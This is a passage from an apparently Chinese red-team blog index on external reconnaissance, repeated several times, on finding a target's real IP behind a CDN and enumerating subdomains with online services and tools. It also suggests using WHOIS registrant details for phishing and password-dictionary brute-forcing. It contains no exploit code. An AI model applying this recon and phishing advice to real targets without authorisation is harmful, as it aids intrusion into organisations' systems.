反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#9-目标敏感文件泄露"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#10-扫描全网"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#11-从-cdn-入手"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#12-利用http标头寻找真实原始ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#13-利用网站返回的内容寻找真实原始ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 